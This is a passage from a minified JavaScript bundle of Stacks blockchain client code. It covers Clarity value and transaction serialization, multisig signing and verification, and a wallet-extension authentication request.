          return H.set(e, r), D(e, t);
        }
        class M {
          constructor(e) {
            (this.consumed = 0), (this.source = e);
          }
          readBytes(e) {
            const t = this.source.subarray(this.consumed, this.consumed + e);
            return (this.consumed += e), t;
          }
          readUInt32BE() {
            return (
              (e = this.readBytes(4))[(t = 0)] * 2 ** 24 +
              65536 * e[t + 1] +
              256 * e[t + 2] +
              e[t + 3]
            );
            var e, t;
          }
          readUInt8() {
            return this.readBytes(1)[0];
          }
          readUInt16BE() {
            return (
              (((e = this.readBytes(2))[(t = 0) + 0] << 8) | e[t + 1]) >>> 0
            );
            var e, t;
          }
          readBigUIntLE(e) {
            const t = this.readBytes(e).slice().reverse(),
              n = (0, u.ci)(t);
            return BigInt(`0x${n}`);
          }
          readBigUIntBE(e) {
            const t = this.readBytes(e),
              n = (0, u.ci)(t);
            return BigInt(`0x${n}`);
          }
          get readOffset() {
            return this.consumed;
          }
          set readOffset(e) {
            this.consumed = e;
          }
          get internalBytes() {
            return this.source;
          }
          readUInt8Enum(e, t) {
            const n = this.readUInt8();
            if (D(e, n)) return n;
            throw t(n);
          }
        }
        const F = (e) => ({ type: r.StringASCII, data: e }),
          j = (e) => ({ type: r.StringUTF8, data: e });
        function z(e) {
          let t;
          if ("string" === typeof e) {
            const n = "0x" === e.slice(0, 2).toLowerCase();
            t = new M((0, u.nr)(n ? e.slice(2) : e));
          } else t = e instanceof Uint8Array ? new M(e) : e;
          switch (
            t.readUInt8Enum(r, (e) => {
              throw new b(`Cannot recognize Clarity Type: ${e}`);
            })
          ) {
            case r.Int:
              return O(t.readBytes(16));
            case r.UInt:
              return B(t.readBytes(16));
            case r.Buffer:
              const e = t.readUInt32BE();
              return P(t.readBytes(e));
            case r.BoolTrue:
              return _();
            case r.BoolFalse:
              return U();
            case r.PrincipalStandard:
              const o = re(t);
              return (i = o), { type: r.PrincipalStandard, address: i };
            case r.PrincipalContract:
              return R(re(t), ae(t));
            case r.ResponseOk:
              return (function (e) {
                return { type: r.ResponseOk, value: e };
              })(z(t));
            case r.ResponseErr:
              return (function (e) {
                return { type: r.ResponseErr, value: e };
              })(z(t));
            case r.OptionalNone:
              return L();
            case r.OptionalSome:
              return $(z(t));
            case r.List:
              const s = t.readUInt32BE(),
                a = [];
              for (let n = 0; n < s; n++) a.push(z(t));
              return (n = a), { type: r.List, list: n };
            case r.Tuple:
              const l = t.readUInt32BE(),
                c = {};
              for (let n = 0; n < l; n++) {
                const e = ae(t).content;
                if (void 0 === e) throw new b('"content" is undefined');
                c[e] = z(t);
              }
              return (function (e) {
                for (const t in e)
                  if (!(0, h.YI)(t))
                    throw new Error(`"${t}" is not a valid Clarity name`);
                return { type: r.Tuple, data: e };
              })(c);
            case r.StringASCII:
              const f = t.readUInt32BE(),
                d = (0, u.Qs)(t.readBytes(f));
              return F(d);
            case r.StringUTF8:
              const p = t.readUInt32BE(),
                g = (0, u.Md)(t.readBytes(p));
              return j(g);
            default:
              throw new b(
                "Unable to deserialize Clarity Value from Uint8Array. Could not find valid Clarity Type."
              );
          }
          var n, i;
        }
        function K(e, t, n) {
          return (
            "string" === typeof e && (e = p(e)),
            "string" === typeof t && (t = p(t, 4, 1e5)),
            "number" === typeof n
              ? {
                  type: c.L8.Payload,
                  payloadType: c.MX.VersionedSmartContract,
                  clarityVersion: n,
                  contractName: e,
                  codeBody: t,
                }
              : {
                  type: c.L8.Payload,
                  payloadType: c.MX.SmartContract,
                  contractName: e,
                  codeBody: t,
                }
          );
        }
        function W(e, t) {
          if (e.byteLength != c.GY)
            throw Error(`Coinbase buffer size must be ${c.GY} bytes`);
          return void 0 != t
            ? {
                type: c.L8.Payload,
                payloadType: c.MX.CoinbaseToAltRecipient,
                coinbaseBytes: e,
                recipient: t,
              }
            : {
                type: c.L8.Payload,
                payloadType: c.MX.Coinbase,
                coinbaseBytes: e,
              };
        }
        function V(e) {
          const t = [];
          switch ((t.push(e.payloadType), e.payloadType)) {
            case c.MX.TokenTransfer:
              t.push(A(e.recipient)),
                t.push((0, u.sO)(e.amount, !1, 8)),
                t.push(ee(e.memo));
              break;
            case c.MX.ContractCall:
              t.push(ee(e.contractAddress)),
                t.push(ee(e.contractName)),
                t.push(ee(e.functionName));
              const n = new Uint8Array(4);
              y(n, e.functionArgs.length, 0),
                t.push(n),
                e.functionArgs.forEach((e) => {
                  t.push(A(e));
                });
              break;
            case c.MX.SmartContract:
              t.push(ee(e.contractName)), t.push(ee(e.codeBody));
              break;
            case c.MX.VersionedSmartContract:
              t.push(e.clarityVersion),
                t.push(ee(e.contractName)),
                t.push(ee(e.codeBody));
              break;
            case c.MX.PoisonMicroblock:
              break;
            case c.MX.Coinbase:
              t.push(e.coinbaseBytes);
              break;
            case c.MX.CoinbaseToAltRecipient:
              t.push(e.coinbaseBytes), t.push(A(e.recipient));
          }
          return (0, u.WW)(t);
        }
        function q(e) {
          switch (
            e.readUInt8Enum(c.MX, (e) => {
              throw new Error(`Cannot recognize PayloadType: ${e}`);
            })
          ) {
            case c.MX.TokenTransfer:
              return (function (e, t, n) {
                var r;
                return (
                  "string" === typeof e && (e = N(e)),
                  "string" === typeof n && (n = le(n)),
                  {
                    type: c.L8.Payload,
                    payloadType: c.MX.TokenTransfer,
                    recipient: e,
                    amount: (0, u.HN)(t, !1),
                    memo: null !== (r = n) && void 0 !== r ? r : le(""),
                  }
                );
              })(z(e), (0, u.HN)(e.readBytes(8), !1), ce(e));
            case c.MX.ContractCall:
              const t = re(e),
                n = ae(e),
                r = ae(e),
                i = [],
                o = e.readUInt32BE();
              for (let s = 0; s < o; s++) {
                const t = z(e);
                i.push(t);
              }
              return (function (e, t, n, r) {
                return (
                  "string" === typeof e && (e = g(e)),
                  "string" === typeof t && (t = p(t)),
                  "string" === typeof n && (n = p(n)),
                  {
                    type: c.L8.Payload,
                    payloadType: c.MX.ContractCall,
                    contractAddress: e,
                    contractName: t,
                    functionName: n,
                    functionArgs: r,
                  }
                );
              })(t, n, r, i);
            case c.MX.SmartContract:
              return K(ae(e), ae(e, 4, 1e5));
            case c.MX.VersionedSmartContract: {
              const t = e.readUInt8Enum(c.y, (e) => {
                throw new Error(`Cannot recognize ClarityVersion: ${e}`);
              });
              return K(ae(e), ae(e, 4, 1e5), t);
            }
            case c.MX.PoisonMicroblock:
              return { type: c.L8.Payload, payloadType: c.MX.PoisonMicroblock };
            case c.MX.Coinbase:
              return W(e.readBytes(c.GY));
            case c.MX.CoinbaseToAltRecipient:
              return W(e.readBytes(c.GY), z(e));
          }
        }
        var G,
          Y = n(7354);
        function Z(e) {
          return (0, Y.V1)((0, u.ci)(e.readBytes(c.UE)));
        }
        function J(e, t) {
          return {
            pubKeyEncoding: e,
            type: c.L8.TransactionAuthField,
            contents: t,
          };
        }
        function X(e) {
          const t = e.readUInt8Enum(G, (e) => {
            throw new b(`Could not read ${e} as AuthFieldType`);
          });
          switch (t) {
            case G.PublicKeyCompressed:
              return J(c.gW.Compressed, (0, f.aQ)(e));
            case G.PublicKeyUncompressed:
              return J(c.gW.Uncompressed, (0, f.aQ)(e));
            case G.SignatureCompressed:
              return J(c.gW.Compressed, Z(e));
            case G.SignatureUncompressed:
              return J(c.gW.Uncompressed, Z(e));
            default:
              throw new Error(`Unknown auth field type: ${JSON.stringify(t)}`);
          }
        }
        function Q(e) {
          return (0, u.nr)(e.data);
        }
        function ee(e) {
          switch (e.type) {
            case c.L8.Address:
              return ne(e);
            case c.L8.Principal:
              return ie(e);
            case c.L8.LengthPrefixedString:
              return se(e);
            case c.L8.MemoString:
              return (function (e) {
                const t = [],
                  n = (0, u.iY)(e.content),
                  r = (0, h.Sq)((0, u.ci)(n), 2 * c.dV);
                return t.push((0, u.nr)(r)), (0, u.WW)(t);
              })(e);
            case c.L8.AssetInfo:
              return ue(e);
            case c.L8.PostCondition:
              return ge(e);
            case c.L8.PublicKey:
              return (0, f.dK)(e);
            case c.L8.LengthPrefixedList:
              return de(e);
            case c.L8.Payload:
              return V(e);
            case c.L8.TransactionAuthField:
              return (function (e) {
                const t = [];
                switch (e.contents.type) {
                  case c.L8.PublicKey:
                    e.pubKeyEncoding == c.gW.Compressed
                      ? (t.push(G.PublicKeyCompressed),
                        t.push((0, f.dK)(e.contents)))
                      : (t.push(G.PublicKeyUncompressed),
                        t.push((0, f.dK)((0, f.Lg)(e.contents.data))));
                    break;
                  case c.L8.MessageSignature:
                    e.pubKeyEncoding == c.gW.Compressed
                      ? t.push(G.SignatureCompressed)
                      : t.push(G.SignatureUncompressed),
                      t.push(Q(e.contents));
                }
                return (0, u.WW)(t);
              })(e);
            case c.L8.MessageSignature:
              return Q(e);
          }
        }
        function te(e, t, n, r) {
          if (0 === r.length) throw Error("Invalid number of public keys");
          if (
            (t === c.dO.SerializeP2PKH || t === c.dO.SerializeP2WPKH) &&
            (1 !== r.length || 1 !== n)
          )
            throw Error("Invalid number of public keys or signatures");
          if (t === c.dO.SerializeP2WPKH || t === c.dO.SerializeP2WSH)
            for (let i = 0; i < r.length; i++)
              if (!(0, f.Dn)(r[i]))
                throw Error("Public keys must be compressed for segwit");
          switch (t) {
            case c.dO.SerializeP2PKH:
              return (0, Y.fi)(e, (0, h.D2)(r[0].data));
            case c.dO.SerializeP2WPKH:
              return (0, Y.fi)(e, (0, h.rv)(r[0].data));
            case c.dO.SerializeP2SH:
              return (0, Y.fi)(e, (0, h.UI)(n, r.map(f.dK)));
            case c.dO.SerializeP2WSH:
              return (0, Y.fi)(e, (0, h.tM)(n, r.map(f.dK)));
          }
        }
        function ne(e) {
          const t = [];
          return (
            t.push((0, u.nr)((0, u.I4)(e.version, 1))),
            t.push((0, u.nr)(e.hash160)),
            (0, u.WW)(t)
          );
        }
        function re(e) {
          const t = (0, u.WR)((0, u.ci)(e.readBytes(1))),
            n = (0, u.ci)(e.readBytes(20));
          return { type: c.L8.Address, version: t, hash160: n };
        }
        function ie(e) {
          const t = [];
          return (
            t.push(e.prefix),
            t.push(ne(e.address)),
            e.prefix === c.YZ.Contract && t.push(se(e.contractName)),
            (0, u.WW)(t)
          );
        }
        function oe(e) {
          const t = e.readUInt8Enum(c.YZ, (e) => {
              throw new b(`Unexpected Principal payload type: ${e}`);
            }),
            n = re(e);
          if (t === c.YZ.Standard)
            return { type: c.L8.Principal, prefix: t, address: n };
          const r = ae(e);
          return {
            type: c.L8.Principal,
            prefix: t,
            address: n,
            contractName: r,
          };
        }
        function se(e) {
          const t = [],
            n = (0, u.iY)(e.content),
            r = n.byteLength;
          return (
            t.push((0, u.nr)((0, u.I4)(r, e.lengthPrefixBytes))),
            t.push(n),
            (0, u.WW)(t)
          );
        }
        function ae(e, t, n) {
          t = t || 1;
          const r = (0, u.WR)((0, u.ci)(e.readBytes(t)));
          return p(
            (0, u.Md)(e.readBytes(r)),
            t,
            null !== n && void 0 !== n ? n : 128
          );
        }
        function le(e) {
          if (e && (0, h.pw)(e, c.dV))
            throw new Error(`Memo exceeds maximum length of ${c.dV} bytes`);
          return { type: c.L8.MemoString, content: e };
        }
        function ce(e) {
          const t = (0, u.Md)(e.readBytes(c.dV));
          return { type: c.L8.MemoString, content: t };
        }
        function ue(e) {
          const t = [];
          return (
            t.push(ne(e.address)),
            t.push(se(e.contractName)),
            t.push(se(e.assetName)),
            (0, u.WW)(t)
          );
        }
        function fe(e) {
          return {
            type: c.L8.AssetInfo,
            address: re(e),
            contractName: ae(e),
            assetName: ae(e),
          };
        }
        function he(e, t) {
          return {
            type: c.L8.LengthPrefixedList,
            lengthPrefixBytes: t || 4,
            values: e,
          };
        }
        function de(e) {
          const t = e.values,
            n = [];
          n.push((0, u.nr)((0, u.I4)(t.length, e.lengthPrefixBytes)));
          for (const r of t) n.push(ee(r));
          return (0, u.WW)(n);
        }
        function pe(e, t, n) {
          const r = (0, u.WR)((0, u.ci)(e.readBytes(n || 4))),
            i = [];
          for (let o = 0; o < r; o++)
            switch (t) {
              case c.L8.Address:
                i.push(re(e));
                break;
              case c.L8.LengthPrefixedString:
                i.push(ae(e));
                break;
              case c.L8.MemoString:
                i.push(ce(e));
                break;
              case c.L8.AssetInfo:
                i.push(fe(e));
                break;
              case c.L8.PostCondition:
                i.push(ye(e));
                break;
              case c.L8.PublicKey:
                i.push((0, f.aQ)(e));
                break;
              case c.L8.TransactionAuthField:
                i.push(X(e));
            }
          return he(i, n);
        }
        function ge(e) {
          const t = [];
          return (
            t.push(e.conditionType),
            t.push(ie(e.principal)),
            (e.conditionType !== c.sX.Fungible &&
              e.conditionType !== c.sX.NonFungible) ||
              t.push(ue(e.assetInfo)),
            e.conditionType === c.sX.NonFungible && t.push(A(e.assetName)),
            t.push(e.conditionCode),
            (e.conditionType !== c.sX.STX &&
              e.conditionType !== c.sX.Fungible) ||
              t.push((0, u.sO)(e.amount, !1, 8)),
            (0, u.WW)(t)
          );
        }
        function ye(e) {
          const t = e.readUInt8Enum(c.sX, (e) => {
              throw new b(`Could not read ${e} as PostConditionType`);
            }),
            n = oe(e);
          let r, i, o;
          switch (t) {
            case c.sX.STX:
              return (
                (r = e.readUInt8Enum(c.DY, (e) => {
                  throw new b(`Could not read ${e} as FungibleConditionCode`);
                })),
                (o = BigInt(`0x${(0, u.ci)(e.readBytes(8))}`)),
                {
                  type: c.L8.PostCondition,
                  conditionType: c.sX.STX,
                  principal: n,
                  conditionCode: r,
                  amount: o,
                }
              );
            case c.sX.Fungible:
              return (
                (i = fe(e)),
                (r = e.readUInt8Enum(c.DY, (e) => {
                  throw new b(`Could not read ${e} as FungibleConditionCode`);
                })),
                (o = BigInt(`0x${(0, u.ci)(e.readBytes(8))}`)),
                {
                  type: c.L8.PostCondition,
                  conditionType: c.sX.Fungible,
                  principal: n,
                  conditionCode: r,
                  amount: o,
                  assetInfo: i,
                }
              );
            case c.sX.NonFungible:
              i = fe(e);
              const t = z(e);
              return (
                (r = e.readUInt8Enum(c.Am, (e) => {
                  throw new b(`Could not read ${e} as FungibleConditionCode`);
                })),
                {
                  type: c.L8.PostCondition,
                  conditionType: c.sX.NonFungible,
                  principal: n,
                  conditionCode: r,
                  assetInfo: i,
                  assetName: t,
                }
              );
          }
        }
        function we() {
          return {
            type: c.L8.MessageSignature,
            data: (0, u.ci)(new Uint8Array(c.UE)),
          };
        }
        function me(e, t, n, r) {
          const i = te(0, e, 1, [(0, f.NG)(t)]).hash160,
            o = (0, f.Dn)((0, f.NG)(t)) ? c.gW.Compressed : c.gW.Uncompressed;
          return {
            hashMode: e,
            signer: i,
            nonce: (0, u.HN)(n, !1),
            fee: (0, u.HN)(r, !1),
            keyEncoding: o,
            signature: we(),
          };
        }
        function be(e) {
          return "signature" in e;
        }
        function ve(e) {
          const t = (0, h.Xh)(e);
          return (
            (t.nonce = 0),
            (t.fee = 0),
            be(t) ? (t.signature = we()) : (t.fields = []),
            { ...t, nonce: BigInt(0), fee: BigInt(0) }
          );
        }
        function Ee(e) {
          return be(e)
            ? (function (e) {
                const t = [
                  e.hashMode,
                  (0, u.nr)(e.signer),
                  (0, u.sO)(e.nonce, !1, 8),
                  (0, u.sO)(e.fee, !1, 8),
                  e.keyEncoding,
                  Q(e.signature),
                ];
                return (0, u.WW)(t);
              })(e)
            : (function (e) {
                const t = [
                    e.hashMode,
                    (0, u.nr)(e.signer),
                    (0, u.sO)(e.nonce, !1, 8),
                    (0, u.sO)(e.fee, !1, 8),
                  ],
                  n = he(e.fields);
                t.push(de(n));
                const r = new Uint8Array(2);
                return (
                  (function (e, t, n) {
                    (e[n + 0] = t >>> 8), (e[n + 1] = t >>> 0);
                  })(r, e.signaturesRequired, 0),
                  t.push(r),
                  (0, u.WW)(t)
                );
              })(e);
        }
        function Se(e) {
          const t = e.readUInt8Enum(c.dO, (e) => {
            throw new b(`Could not parse ${e} as AddressHashMode`);
          });
          return t === c.dO.SerializeP2PKH || t === c.dO.SerializeP2WPKH
            ? (function (e, t) {
                const n = (0, u.ci)(t.readBytes(20)),
                  r = BigInt(`0x${(0, u.ci)(t.readBytes(8))}`),
                  i = BigInt(`0x${(0, u.ci)(t.readBytes(8))}`),
                  o = t.readUInt8Enum(c.gW, (e) => {
                    throw new b(`Could not parse ${e} as PubKeyEncoding`);
                  });
                if (e === c.dO.SerializeP2WPKH && o != c.gW.Compressed)
                  throw new b(
                    "Failed to parse singlesig spending condition: incomaptible hash mode and key encoding"
                  );
                return {
                  hashMode: e,
                  signer: n,
                  nonce: r,
                  fee: i,
                  keyEncoding: o,
                  signature: Z(t),
                };
              })(t, e)
            : (function (e, t) {
                const n = (0, u.ci)(t.readBytes(20)),
                  r = BigInt("0x" + (0, u.ci)(t.readBytes(8))),
                  i = BigInt("0x" + (0, u.ci)(t.readBytes(8))),
                  o = pe(t, c.L8.TransactionAuthField).values;
                let s = !1,
                  a = 0;
                for (const u of o)
                  switch (u.contents.type) {
                    case c.L8.PublicKey:
                      (0, f.Dn)(u.contents) || (s = !0);
                      break;
                    case c.L8.MessageSignature:
                      if (
                        (u.pubKeyEncoding === c.gW.Uncompressed && (s = !0),
                        (a += 1),
                        65536 === a)
                      )
                        throw new E(
                          "Failed to parse multisig spending condition: too many signatures"
                        );
                  }
                const l = t.readUInt16BE();
                if (s && e === c.dO.SerializeP2SH)
                  throw new E(
                    "Uncompressed keys are not allowed in this hash mode"
                  );
                return {
                  hashMode: e,
                  signer: n,
                  nonce: r,
                  fee: i,
                  fields: o,
                  signaturesRequired: l,
                };
              })(t, e);
        }
        function xe(e, t, n, r) {
          const i =
            e +
            (0, u.ci)(new Uint8Array([t])) +
            (0, u.ci)((0, u.sO)(n, !1, 8)) +
            (0, u.ci)((0, u.sO)(r, !1, 8));
          if (49 !== (0, u.nr)(i).byteLength)
            throw Error("Invalid signature hash length");
          return (0, h.G8)((0, u.nr)(i));
        }
        function Ae(e, t, n) {
          const r = 33 + c.UE,
            i = (0, f.Dn)(t) ? c.gW.Compressed : c.gW.Uncompressed,
            o = e + (0, h.c1)(i.toString(16)) + n.data,
            s = (0, u.nr)(o);
          if (s.byteLength > r) throw Error("Invalid signature hash length");
          return (0, h.G8)(s);
        }
        function ke(e, t, n, r, i, o) {
          const s = xe(e, t, n, r),
            a = (0, f.NG)((0, f.D5)(s, o, i));
          return { pubKey: a, nextSigHash: Ae(s, a, o) };
        }
        function Te() {
          const e = me(c.dO.SerializeP2PKH, "", 0, 0);
          return (
            (e.signer = (c.L8.Address, c.TK.MainnetSingleSig, "0".repeat(40))),
            (e.keyEncoding = c.gW.Compressed),
            (e.signature = we()),
            e
          );
        }
        function Ce(e, t, n) {
          return be(e)
            ? (function (e, t, n) {
                const { pubKey: r, nextSigHash: i } = ke(
                    t,
                    n,
                    e.fee,
                    e.nonce,
                    e.keyEncoding,
                    e.signature
                  ),
                  o = te(0, e.hashMode, 1, [r]).hash160;
                if (o !== e.signer)
                  throw new E(
                    `Signer hash does not equal hash of public key(s): ${o} != ${e.signer}`
                  );
                return i;
              })(e, t, n)
            : (function (e, t, n) {
                const r = [];
                let i = t,
                  o = !1,
                  s = 0;
                for (const l of e.fields) {
                  let t;
                  switch (l.contents.type) {
                    case c.L8.PublicKey:
                      (0, f.Dn)(l.contents) || (o = !0), (t = l.contents);
                      break;
                    case c.L8.MessageSignature:
                      l.pubKeyEncoding === c.gW.Uncompressed && (o = !0);
                      const { pubKey: r, nextSigHash: a } = ke(
                        i,
                        n,
                        e.fee,
                        e.nonce,
                        l.pubKeyEncoding,
                        l.contents
                      );
                      if (((i = a), (t = r), (s += 1), 65536 === s))
                        throw new E("Too many signatures");
                  }
                  r.push(t);
                }
                if (s !== e.signaturesRequired)
                  throw new E("Incorrect number of signatures");
                if (o && e.hashMode === c.dO.SerializeP2SH)
                  throw new E(
                    "Uncompressed keys are not allowed in this hash mode"
                  );
                const a = te(0, e.hashMode, e.signaturesRequired, r).hash160;
                if (a !== e.signer)
                  throw new E(
                    `Signer hash does not equal hash of public key(s): ${a} != ${e.signer}`
                  );
                return i;
              })(e, t, n);
        }
        function Ie(e) {
          return { authType: c.Gr.Standard, spendingCondition: e };
        }
        function Oe(e, t) {
          return {
            authType: c.Gr.Sponsored,
            spendingCondition: e,
            sponsorSpendingCondition:
              t || me(c.dO.SerializeP2PKH, "0".repeat(66), 0, 0),
          };
        }
        function Be(e) {
          if (e.spendingCondition)
            switch (e.authType) {
              case c.Gr.Standard:
                return Ie(ve(e.spendingCondition));
              case c.Gr.Sponsored:
                return Oe(ve(e.spendingCondition), Te());
              default:
                throw new v("Unexpected authorization type for signing");
            }
          throw new Error("Authorization missing SpendingCondition");
        }
        !(function (e) {
          (e[(e.PublicKeyCompressed = 0)] = "PublicKeyCompressed"),
            (e[(e.PublicKeyUncompressed = 1)] = "PublicKeyUncompressed"),
            (e[(e.SignatureCompressed = 2)] = "SignatureCompressed"),
            (e[(e.SignatureUncompressed = 3)] = "SignatureUncompressed");
        })(G || (G = {}));
        class Pe {
          constructor(e, t, n, r, i, o, s) {
            if (
              ((this.version = e),
              (this.auth = t),
              (this.payload =
                "amount" in n ? { ...n, amount: (0, u.HN)(n.amount, !1) } : n),
              (this.chainId = null !== s && void 0 !== s ? s : c.rC),
              (this.postConditionMode =
                null !== i && void 0 !== i ? i : c.hW.Deny),
              (this.postConditions = null !== r && void 0 !== r ? r : he([])),
              o)
            )
              this.anchorMode = (0, c.gO)(o);
            else
              switch (n.payloadType) {
                case c.MX.Coinbase:
                case c.MX.CoinbaseToAltRecipient:
                case c.MX.PoisonMicroblock:
                  this.anchorMode = c.u0.OnChainOnly;
                  break;
                case c.MX.ContractCall:
                case c.MX.SmartContract:
                case c.MX.VersionedSmartContract:
                case c.MX.TokenTransfer:
                  this.anchorMode = c.u0.Any;
              }
          }
          signBegin() {
            const e = (0, h.Xh)(this);
            return (e.auth = Be(e.auth)), e.txid();
          }
          verifyBegin() {
            const e = (0, h.Xh)(this);
            return (e.auth = Be(e.auth)), e.txid();
          }
          verifyOrigin() {
            return (function (e, t) {
              switch (e.authType) {
                case c.Gr.Standard:
                case c.Gr.Sponsored:
                  return Ce(e.spendingCondition, t, c.Gr.Standard);
                default:
                  throw new v("Invalid origin auth type");
              }
            })(this.auth, this.verifyBegin());
          }
          signNextOrigin(e, t) {
            if (void 0 === this.auth.spendingCondition)
              throw new Error('"auth.spendingCondition" is undefined');
            if (void 0 === this.auth.authType)
              throw new Error('"auth.authType" is undefined');
            return this.signAndAppend(
              this.auth.spendingCondition,
              e,
              c.Gr.Standard,
              t
            );
          }
          signNextSponsor(e, t) {
            if (this.auth.authType === c.Gr.Sponsored)
              return this.signAndAppend(
                this.auth.sponsorSpendingCondition,
                e,
                c.Gr.Sponsored,
                t
              );
            throw new Error('"auth.sponsorSpendingCondition" is undefined');
          }
          appendPubkey(e) {
            const t = this.auth.spendingCondition;
            if (!t || be(t))
              throw new Error(
                "Can't append public key to a singlesig condition"
              );
            {
              const n = (0, f.Dn)(e);
              t.fields.push(J(n ? c.gW.Compressed : c.gW.Uncompressed, e));
            }
          }
          signAndAppend(e, t, n, r) {
            const { nextSig: i, nextSigHash: o } = (function (e, t, n, r, i) {
              const o = xe(e, t, n, r),
                s = (0, f.fJ)(i, o);
              return { nextSig: s, nextSigHash: Ae(o, (0, f.$3)(i), s) };
            })(t, n, e.fee, e.nonce, r);
            if (be(e)) e.signature = i;
            else {
              const t = (0, u.ci)(r.data).endsWith("01");
              e.fields.push(J(t ? c.gW.Compressed : c.gW.Uncompressed, i));
            }
            return o;
          }
          txid() {
            const e = this.serialize();
            return (0, h.G8)(e);
          }
          setSponsor(e) {
            if (this.auth.authType != c.Gr.Sponsored)
              throw new v("Cannot sponsor sign a non-sponsored transaction");
            this.auth = (function (e, t) {
              return {
                ...e,
                sponsorSpendingCondition: {
                  ...t,
                  nonce: (0, u.HN)(t.nonce, !1),
                  fee: (0, u.HN)(t.fee, !1),
                },
              };
            })(this.auth, e);
          }
          setFee(e) {
            this.auth = (function (e, t) {
              switch (e.authType) {
                case c.Gr.Standard:
                  const n = { ...e.spendingCondition, fee: (0, u.HN)(t, !1) };
                  return { ...e, spendingCondition: n };
                case c.Gr.Sponsored:
                  const r = {
                    ...e.sponsorSpendingCondition,
                    fee: (0, u.HN)(t, !1),
                  };
                  return { ...e, sponsorSpendingCondition: r };
              }
            })(this.auth, e);
          }
          setNonce(e) {
            this.auth = (function (e, t) {
              const n = { ...e.spendingCondition, nonce: (0, u.HN)(t, !1) };
              return { ...e, spendingCondition: n };
            })(this.auth, e);
          }
          setSponsorNonce(e) {
            if (this.auth.authType != c.Gr.Sponsored)
              throw new v("Cannot sponsor sign a non-sponsored transaction");
            this.auth = (function (e, t) {
              const n = {
                ...e.sponsorSpendingCondition,
                nonce: (0, u.HN)(t, !1),
              };
              return { ...e, sponsorSpendingCondition: n };
            })(this.auth, e);
          }
          serialize() {
            if (void 0 === this.version) throw new m('"version" is undefined');
            if (void 0 === this.chainId) throw new m('"chainId" is undefined');
            if (void 0 === this.auth) throw new m('"auth" is undefined');
            if (void 0 === this.anchorMode)
              throw new m('"anchorMode" is undefined');
            if (void 0 === this.payload) throw new m('"payload" is undefined');
            const e = [];
            e.push(this.version);
            const t = new Uint8Array(4);
            return (
              y(t, this.chainId, 0),
              e.push(t),
              e.push(
                (function (e) {
                  const t = [];
                  switch ((t.push(e.authType), e.authType)) {
                    case c.Gr.Standard:
                      t.push(Ee(e.spendingCondition));
                      break;
                    case c.Gr.Sponsored:
                      t.push(Ee(e.spendingCondition)),
                        t.push(Ee(e.sponsorSpendingCondition));
                  }
                  return (0, u.WW)(t);
                })(this.auth)
              ),
              e.push(this.anchorMode),
              e.push(this.postConditionMode),
              e.push(de(this.postConditions)),
              e.push(V(this.payload)),
              (0, u.WW)(e)
            );
          }
        }
        function _e(e) {
          let t;
          t =
            "string" === typeof e
              ? "0x" === e.slice(0, 2).toLowerCase()
                ? new M((0, u.nr)(e.slice(2)))
                : new M((0, u.nr)(e))
              : e instanceof Uint8Array
              ? new M(e)
              : e;
          const n = t.readUInt8Enum(c.Kn, (e) => {
              throw new Error(`Could not parse ${e} as TransactionVersion`);
            }),
            r = t.readUInt32BE(),
            i = (function (e) {
              let t;
              switch (
                e.readUInt8Enum(c.Gr, (e) => {
                  throw new b(`Could not parse ${e} as AuthType`);
                })
              ) {
                case c.Gr.Standard:
                  return (t = Se(e)), Ie(t);
                case c.Gr.Sponsored:
                  return (t = Se(e)), Oe(t, Se(e));
              }
            })(t),
            o = t.readUInt8Enum(c.u0, (e) => {
              throw new Error(`Could not parse ${e} as AnchorMode`);
            }),
            s = t.readUInt8Enum(c.hW, (e) => {
              throw new Error(`Could not parse ${e} as PostConditionMode`);
            }),
            a = pe(t, c.L8.PostCondition),
            l = q(t);
          return new Pe(n, i, l, a, s, o, r);
        }
        var Ue = n(3137);
        const Ne = (e, t) =>
          "undefined" === typeof window
            ? Promise.resolve()
            : (0, Ue.p)().then(() =>
                (0, Ue.b)(
                  [
                    [
                      "connect-modal",
                      [
                        [
                          1,
                          "connect-modal",
                          {
                            authOptions: [16],
                            hasOpenedInstall: [32],
                            hasOpenedInstallXverse: [32],
                          },
                        ],
                      ],
                    ],
                  ],
                  t
                )
              );
        !(function () {
          if (
            "undefined" !== typeof window &&
            void 0 !== window.Reflect &&
            void 0 !== window.customElements
          ) {
            var e = HTMLElement;
            (window.HTMLElement = function () {
              return Reflect.construct(e, [], this.constructor);
            }),
              (HTMLElement.prototype = e.prototype),
              (HTMLElement.prototype.constructor = HTMLElement),
              Object.setPrototypeOf(HTMLElement, e);
          }
        })();
        var Re = Object.defineProperty,
          Le = Object.defineProperties,
          $e = Object.getOwnPropertyDescriptors,
          He = Object.getOwnPropertySymbols,
          De = Object.prototype.hasOwnProperty,
          Me = Object.prototype.propertyIsEnumerable,
          Fe = (e, t, n) =>
            t in e
              ? Re(e, t, {
                  enumerable: !0,
                  configurable: !0,
                  writable: !0,
                  value: n,
                })
              : (e[t] = n),
          je = (e, t) => {
            for (var n in t || (t = {})) De.call(t, n) && Fe(e, n, t[n]);
            if (He) for (var n of He(t)) Me.call(t, n) && Fe(e, n, t[n]);
            return e;
          },
          ze = (e, t) => Le(e, $e(t)),
          Ke = (e, t) => {
            var n = {};
            for (var r in e) De.call(e, r) && t.indexOf(r) < 0 && (n[r] = e[r]);
            if (null != e && He)
              for (var r of He(e))
                t.indexOf(r) < 0 && Me.call(e, r) && (n[r] = e[r]);
            return n;
          };
        function We() {
          return window.StacksProvider || window.BlockstackProvider;
        }
        var Ve = "7.3.1";
        "undefined" != typeof window && (window.__CONNECT_VERSION__ = Ve);
        var qe = (e) => {
            if (!e) {
              let t = new o.X(["store_write"], document.location.href);
              e = new s.V({ appConfig: t });
            }
            return e;
          },
          Ge = async (e) => {
            let t = We();
            if (!t)
              throw new Error(
                "Unable to authenticate without Hiro Wallet extension"
              );
            let {
                redirectTo: n = "/",
                manifestPath: r,
                onFinish: i,
                onCancel: o,
                sendToSignIn: s = !1,
                userSession: l,
                appDetails: c,
              } = e,
              u = qe(l);
            u.isUserSignedIn() && u.signUserOut();
            let f = u.generateAndStoreTransitKey(),
              h = u.makeAuthRequest(
                f,
                `${document.location.origin}${n}`,
                `${document.location.origin}${r}`,
                u.appConfig.scopes,
                void 0,
                void 0,
                { sendToSignIn: s, appDetails: c, connectVersion: Ve }
              );
            try {
              let e = await t.authenticationRequest(h);
              await u.handlePendingSignIn(e);
              let n = (0, a.decodeToken)(e),
                r = null == n ? void 0 : n.payload;
              null == i ||
                i({ authResponse: e, authResponsePayload: r, userSession: u });
            } catch (d) {
              console.error("[Connect] Error during auth request", d),
                null == o || o();
            }
          },
          Ye = Array.from({ length: 256 }, (e, t) =>
            t.toString(16).padStart(2, "0")
          );
        function Ze(e) {
          if (!(e instanceof Uint8Array))
